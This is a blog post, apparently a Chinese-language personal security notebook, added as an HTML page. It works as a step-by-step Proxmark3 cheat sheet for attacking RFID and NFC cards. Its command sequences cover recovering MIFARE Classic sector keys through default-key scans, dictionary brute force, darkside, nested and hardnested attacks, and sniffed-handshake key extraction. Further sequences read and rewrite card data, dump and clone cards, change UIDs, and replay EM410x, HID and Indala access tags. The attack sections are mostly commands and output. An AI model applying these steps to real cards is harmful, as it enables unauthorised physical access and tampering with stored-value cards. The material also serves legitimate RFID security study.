@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            Proxmark3 NFC Attack |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Proxmark3 NFC Attack</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-01-25 13:19:00</span>
+        <span class="mobile">2020-01-25 13:19</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Wireless/">Wireless</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/NFC/">NFC</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p> <a class="link"   target="_blank" rel="noopener" href="https://www.elechouse.com/elechouse/index.php?main_page=product_info&cPath=90_93&products_id=2264" >Proxmark3<i class="fas fa-external-link-alt"></i></a>，支持各种高低频卡，可通过配套软件实现破解、嗅探、模拟、复制等功能，被誉为 RFID 界的瑞士军刀。</p>
+<h2 id="安装Proxmark3环境"><a href="#安装Proxmark3环境" class="headerlink" title="安装Proxmark3环境"></a>安装Proxmark3环境</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/Proxmark/proxmark3/wiki/Kali-Linux" >https://github.com/Proxmark/proxmark3/wiki/Kali-Linux<i class="fas fa-external-link-alt"></i></a></p>
+<p> <a class="link"   target="_blank" rel="noopener" href="https://slowmin.com/install_proxmark/" >Install the Proxmark3 on Kali Linux<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">$ sudo apt-get install git build-essential libreadline5 libreadline-dev gcc-arm-none-eabi libusb-0.1-4 libusb-dev libqt4-dev ncurses-dev perl pkg-config libpcsclite-dev pcscd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ubuntu</span></span><br><span class="line">sudo apt install p7zip git build-essential libreadline5 libreadline-dev libusb-0.1-4 libusb-dev libqt4-dev perl pkg-config wget libncurses5-dev gcc-arm-none-eabi libstdc++-arm-none-eabi-newlib libpcsclite-dev pcscd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install Proxmark3</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Proxmark/proxmark3.git</span><br><span class="line"><span class="built_in">cd</span> proxmark3</span><br><span class="line">make clean &amp;&amp; make all</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="确认Proxmark3工作状态"><a href="#确认Proxmark3工作状态" class="headerlink" title="确认Proxmark3工作状态"></a>确认Proxmark3工作状态</h2><p>把PM3连接上，查看是否已经识别设备</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ lsusb</span><br><span class="line">Bus 001 Device 002: ID 0e0f:000b VMware, Inc. </span><br><span class="line">Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub</span><br><span class="line">Bus 002 Device 005: ID 9ac4:4b8f J. Westhues ProxMark-3 RFID Instrument</span><br><span class="line"></span><br><span class="line">$ sudo dmesg | grep -i usb | grep proxmark</span><br><span class="line">......</span><br><span class="line">[ 2836.850296] usb 4-2.4: Product: proxmark3</span><br><span class="line">[ 2836.850297] usb 4-2.4: Manufacturer: proxmark.org</span><br><span class="line">[ 2836.853857] cdc_acm 4-2.4:1.0: ttyACM0: USB ACM device</span><br></pre></td></tr></table></figure>
+
+<p>正常工作状态下，PM3应该只显示白色灯。</p>
+<p>如果连接时亮橘红色和绿色灯，或插入系统时检测不到设备(没反应)，可能需要更新CDC Bootloader。</p>
+<p>操作步骤：</p>
+<ol>
+<li>拔掉USB线，让PM3 断电。</li>
+<li>然后按住PM3侧边的按钮不放，USB插入电脑，此时应该可以检测到设备了。</li>
+<li>继续按着不放，在&#x2F;dev下找到PM3设备串口。kali中应该是&#x2F;dev&#x2F;ttyACM0</li>
+<li>重刷CDC Bootloader</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CDC Bootloader</span></span><br><span class="line"><span class="built_in">cd</span> proxmark3/client</span><br><span class="line">sudo ./flasher /dev/ttyACM0 -b ../bootrom/obj/bootrom.elf</span><br></pre></td></tr></table></figure>
+
+<p>重刷完CDC Bootloader之后，系统应该能正常识别PM3了。</p>
+<ol start="5">
+<li>更新固件Firmware</li>
+</ol>
+<p>继续按住按钮不放，执行下面的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> proxmark3/client</span><br><span class="line">sudo ./flasher /dev/ttyACM0 ../armsrc/obj/fullimage.elf</span><br></pre></td></tr></table></figure>
+
+
+
+<p>设备状态正常的情况下，执行下面的命令进行proxmark3工具的命令交互界面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./proxmark3 /dev/ttyACM0</span><br></pre></td></tr></table></figure>
+
+<p>查看下PM3设备的基本状态</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">proxmark3&gt; hw status （hw sta）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看固件版本</span></span><br><span class="line">proxmark3&gt; hw version（hw ver）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试电压</span></span><br><span class="line">proxmark3&gt; hw tune</span><br><span class="line">Measuring antenna characteristics, please <span class="built_in">wait</span>........          </span><br><span class="line"><span class="comment"># LF antenna: 22.27 V @   125.00 kHz          </span></span><br><span class="line"><span class="comment"># LF antenna: 31.76 V @   134.00 kHz          </span></span><br><span class="line"><span class="comment"># LF optimal: 31.76 V @   133.33 kHz          </span></span><br><span class="line"><span class="comment"># HF antenna: 20.17 V @    13.56 MHz          </span></span><br><span class="line">Displaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="破解扇区密钥"><a href="#破解扇区密钥" class="headerlink" title="破解扇区密钥"></a>破解扇区密钥</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/k1two2/p/5706516.html" >https://www.cnblogs.com/k1two2/p/5706516.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37806908/article/details/95992392" >https://blog.csdn.net/qq_37806908/article/details/95992392<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="出厂默认密钥"><a href="#出厂默认密钥" class="headerlink" title="出厂默认密钥"></a>出厂默认密钥</h2><p>M1卡出厂时使用统一的默认密钥，密钥A和密钥B的值均为FFFFFFFFFFFF，控制位为FF087069，也有一部分制造商使用自己的简单密钥作为出厂密钥。发卡商为了便利通常使用厂家提供的默认密钥，或者仅仅将包含重要数据的扇区修改密钥。对M1卡的扇区进行默认密钥扫描有助于我们提高破解的效率，并且可用来判断该卡是否为全加密卡，若未扫描到默认密钥则直接使用嗅探手段获取密钥。</p>
+<p>使用<code>hf mf chk *4 ? t</code>命令开始扫描，该命令使用12个全球通用的默认密钥扫描0-39扇区，若事先知道所用数据在多少扇区及对应的密钥类型，可以修改指令来缩短扫描时间。扫描大概需要1分钟时间，完成后可以看到除了10-15扇区外其他扇区的密钥均为FFFFFFFFFFFF，这说明10-15扇区存放了一卡通的关键数据，这6个扇区就是后续数据分析研究的重点对象。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; hf search</span><br><span class="line">proxmark3&gt; hf 14a info</span><br><span class="line"></span><br><span class="line"><span class="comment">#扫描所有扇区默认密钥</span></span><br><span class="line">proxmark3&gt; hf mf chk * ?</span><br><span class="line"></span><br><span class="line"><span class="comment">#扫描0扇区A密码</span></span><br><span class="line">proxmark3&gt; hf mf chk 0 A   </span><br><span class="line"></span><br><span class="line"><span class="comment">#扫描扇区2第7块A密码</span></span><br><span class="line">proxmark3&gt; hf mf chk 8 A</span><br><span class="line"></span><br><span class="line"><span class="comment">#注：(中间的数字是块数，0扇区块编号0-3，1扇区块数编号4-7，2扇区块数编号8-11)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="密钥字典爆破"><a href="#密钥字典爆破" class="headerlink" title="密钥字典爆破"></a>密钥字典爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字典爆破全扇区AB密钥</span></span><br><span class="line">proxmark3&gt; hf mf chk * ? /home/ssooking/key.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#字典爆破全扇区A密钥</span></span><br><span class="line">proxmark3&gt; hf mf chk * A /home/ssooking/test.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#字典爆破0扇区A密钥</span></span><br><span class="line">proxmark3&gt; hf mf chk 0 A /home/ssooking/key.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#字典爆破2扇区B密钥</span></span><br><span class="line">proxmark3&gt; hf mf chk A /home/ssooking/key.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Dark-Side-Attack"><a href="#Dark-Side-Attack" class="headerlink" title="Dark-Side Attack"></a>Dark-Side Attack</h2><p>（仅适用于Weak Prng）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; hf mf mifare</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Nested-Authentication-Exploit"><a href="#Nested-Authentication-Exploit" class="headerlink" title="Nested Authentication Exploit"></a>Nested Authentication Exploit</h2><p>（仅适用于Weak Prng）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#已知某密钥的情况下执行NESTED攻击进行嵌套攻击，枚举&amp;爆破key:</span></span><br><span class="line"><span class="comment">#＃使用已知密钥运行嵌套攻击</span></span><br><span class="line">proxmark3&gt; hf mf nested 1 [sector] [key_A/B] [known_key_val]</span><br><span class="line">proxmark3&gt; hf mf nested 1 0 A ffffffffffff</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用mfoc或者mfuck等工具破解某个扇区的密钥</p>
+<h2 id="验证key是否正确"><a href="#验证key是否正确" class="headerlink" title="验证key是否正确"></a>验证key是否正确</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试⼀下我们拿到的密钥对不对，错误不会返回Found valid key:[xxxxx]</span></span><br><span class="line">proxmark3&gt; hf mf chk 0 A ffffffffffff</span><br><span class="line">proxmark3&gt; hf mf chk 0 ? ffffffffffff</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="读取加密扇区数据"><a href="#读取加密扇区数据" class="headerlink" title="读取加密扇区数据"></a>读取加密扇区数据</h2><p>All of a sudden we have a new key: <code>080808080808</code>. This key allows us to read our secret blocks:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; hf mf rdbl 5 A 080808080808</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入区块内容</span></span><br><span class="line">hf mf wrbl 5 A 080808080808 32110000cdeeffff3211000005fa05fa </span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="克隆卡片"><a href="#克隆卡片" class="headerlink" title="克隆卡片"></a>克隆卡片</h1><ol>
+<li><p>使用上面的方法破解出卡密钥</p>
+</li>
+<li><p>导出加密区密钥（获取全扇区秘钥）</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; hf mf nested 1 0 A xxxxxxxxx d</span><br><span class="line"></span><br><span class="line">proxmark3&gt; hf mf nested 1 0 A ffffffffffff d</span><br><span class="line"></span><br><span class="line"><span class="comment">#此时会输出文件dumpkeys.bin</span></span><br></pre></td></tr></table></figure>
+
+<p>3.导出卡数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#参数：1=1K(default), 2=2K, 4=4K</span></span><br><span class="line">proxmark3&gt; hf mf dump 1</span><br></pre></td></tr></table></figure>
+
+<p>4、写入数据到空白卡</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; hf mf restore 1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>或者或者先处理导出数据文件的格式，将dumpdata.bin这个二进制文件转换成eml格式的文本信息。PM3自带dumptoemul.lua脚本进行处理。处理完后会生成eml文件。此外也可以使用python或perl脚本处理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; hf mf dump				<span class="comment">#输出文件dumpdata.bin</span></span><br><span class="line">proxmark3&gt; script run dumptoemul.lua</span><br><span class="line">...</span><br><span class="line">Wrote an emulator-dump to the file 54CDBDD1.eml</span><br><span class="line"></span><br><span class="line"><span class="comment">#script run dumptoemul -i dumpdata.bin</span></span><br></pre></td></tr></table></figure>
+
+<p>写入数据到空白卡</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; hf mf eclr							 <span class="comment">#清除仿真内存的各区块数据</span></span><br><span class="line">proxmark3&gt; hf mf eload 54CDBDD1    <span class="comment">#加载Mifare标签转储数据到内存中</span></span><br><span class="line">proxmark3&gt; hf mf cload 54CDBDD1		 <span class="comment">#将卡的dump数据写入空白卡</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修改卡UID"><a href="#修改卡UID" class="headerlink" title="修改卡UID"></a>修改卡UID</h2><p>Cracking Mifare Classic 1K Cards</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; hf 14a info</span><br><span class="line">proxmark3&gt; hf mf csetuid 798BBB39 0004 08</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="克隆HID卡"><a href="#克隆HID卡" class="headerlink" title="克隆HID卡"></a>克隆HID卡</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; lf search</span><br><span class="line">...</span><br><span class="line">HID Prox TAG ID: 2004263f88 (8132) - Format Len: 26bit - FC: 19 - Card: 8132  </span><br><span class="line">Valid HID Prox ID Found! </span><br><span class="line"></span><br><span class="line"><span class="comment"># EM410X</span></span><br><span class="line">lf em 410xread</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="嗅探通信"><a href="#嗅探通信" class="headerlink" title="嗅探通信"></a>嗅探通信</h1><p>如果卡片不存在弱RNG问题，唯一可行的破解密钥的方法就是抓取分析握手包。</p>
+<ol>
+<li>识别读卡器上的Classic 1K卡：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hf 14a reader</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>Proxmark3有一个嗅探模式可以记录和转储所有的RFID通信，设置PM3进入嗅探模式：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hf 14a snoop</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><p>开始嗅探数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hf mf sniff</span><br></pre></td></tr></table></figure>
+
+<p>Proxmark3在传输期间必须非常靠近两个设备，完成刷卡后，应按Proxmark3中的按钮停止嗅探。</p>
+</li>
+<li><p>将嗅探模式捕获的数据打印到终端显示</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; hf list 14a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">proxmark3&gt; hf 14a snoop</span><br><span class="line"><span class="comment">#db# cancelled by button</span></span><br><span class="line"><span class="comment">#db# COMMAND FINISHED</span></span><br><span class="line"><span class="comment">#db# maxDataLen=4, Uart.state=0, Uart.len=0</span></span><br><span class="line"><span class="comment">#db# traceLen=3179, Uart.output[0]=000000cb</span></span><br><span class="line"></span><br><span class="line">proxmark3&gt; hf list 14a</span><br><span class="line">Recorded Activity (TraceLen = 3179 bytes)</span><br><span class="line"></span><br><span class="line">Start = Start of Start Bit, End = End of last modulation. Src = Source of Transfer</span><br><span class="line">iso14443a - All <span class="built_in">times</span> are <span class="keyword">in</span> carrier periods (1/13.56Mhz)</span><br><span class="line">iClass    - Timings are not as accurate</span><br><span class="line">xxxx</span><br></pre></td></tr></table></figure>
+
+<p>捕获的数据中如果有感叹号表示位读取错误，可能需要读取多次才能捕获到完整的且没有任何错误的握手包，此时可以获取到提取密钥所需的UID、NT、NR、AR、AT等值。</p>
+<ol start="5">
+<li>在捕获到符合条件的握手包后，提取握手包中的有效密钥</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./tools/mfkey/mfkey64 [CARD_UID] [NT] [NR] [AR] [AT]</span><br><span class="line">./tools/mfkey/mfkey64 9c599b32 82a4166c a1e458ce 6eea41e0 5cadf439 e709c8a</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>成功提取有效密钥后，使用HardNested攻击破击其他密钥</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hf mf hardnested [known_key_block] [known_key_type] [known_key] [target_block] [target_key_type]</span><br><span class="line"></span><br><span class="line">hf mf hardnested 0 A key 0 B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;block number&gt; &lt;key A|B&gt; &lt;key (12 hex symbols)&gt;</span></span><br><span class="line"><span class="comment"># &lt;target block number&gt; &lt;target key A|B&gt; [known target key (12 hex symbols)] [w] [s]</span></span><br><span class="line"><span class="comment"># w: Acquire nonces and write them to binary file nonces.bin</span></span><br><span class="line"></span><br><span class="line">hf mf hardnested 0 A 8829da9daf76 4 A w</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="修改卡数据"><a href="#修改卡数据" class="headerlink" title="修改卡数据"></a>修改卡数据</h1><p>All of a sudden we have a new key: <code>080808080808</code>. This key allows us to read our secret blocks:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; hf mf rdbl 5 A 080808080808</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入区块内容</span></span><br><span class="line">hf mf wrbl 5 A 080808080808 32110000cdeeffff3211000005fa05fa </span><br></pre></td></tr></table></figure>
+
+<p>Once you have all the keys that you need:</p>
+<p>Read the data from a particular block: hf mf rdbl [block] [A&#x2F;B] [key]</p>
+<p>Read all the data for a particular sector: hf mf rdsc [sector] [A&#x2F;B] [key]</p>
+<p>Write a specific block with your own data: hf mf wrbl [block_num] [key_type] [key] [block data]</p>
+<h1 id="模拟卡片"><a href="#模拟卡片" class="headerlink" title="模拟卡片"></a>模拟卡片</h1><p>重放RFID信号</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.offensive-security.com/offsec/cloning-rfid-tags-with-proxmark-3/" >https://www.offensive-security.com/offsec/cloning-rfid-tags-with-proxmark-3/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://scund00r.com/all/rfid/2018/06/05/proxmark-cheatsheet.html" >https://scund00r.com/all/rfid/2018/06/05/proxmark-cheatsheet.html<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### EM410X TAGS</span></span><br><span class="line">Proxmark&gt; lf <span class="built_in">read</span></span><br><span class="line">Proxmark&gt; lf em4x em410xread</span><br><span class="line">EM410x Tag ID: 23004d4dee</span><br><span class="line">Proxmark&gt; lf em4x em410xsim 23004d4dee   <span class="comment">#当Proxmark读取了标签后，便可以尝试重播它</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用PM3模拟Marefare门禁卡：</span></span><br><span class="line">proxmark3&gt; hf mf sim</span><br><span class="line"> uid:N/A, numreads:0, flags:0 (0x00)           </span><br><span class="line"><span class="comment">#db# 4B UID: 2CF0550B              </span></span><br><span class="line"></span><br><span class="line">Proxmark&gt; hf mf eload 54CDBDD1</span><br><span class="line">Proxmark&gt; hf mf sim u 54CDBDD1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Indala</span></span><br><span class="line">lf indala <span class="built_in">read</span></span><br><span class="line">lf indala demod</span><br><span class="line">lf indala sim a0000000c2c436c1</span><br><span class="line">lf indala <span class="built_in">clone</span> a0000000c2c436c1</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="修改卡UID-1"><a href="#修改卡UID-1" class="headerlink" title="修改卡UID"></a>修改卡UID</h2><p>Cracking Mifare Classic 1K Cards <a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=GqHaZicizvg" >https://www.youtube.com/watch?v=GqHaZicizvg<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; hf search</span><br><span class="line">proxmark3&gt; hf search</span><br><span class="line">proxmark3&gt; hf mf csetuid 798BBB39 0004 08</span><br><span class="line"></span><br><span class="line">proxmark3&gt; hf mf csetuid ba2ea6ab</span><br></pre></td></tr></table></figure>
+
+
+
+
+
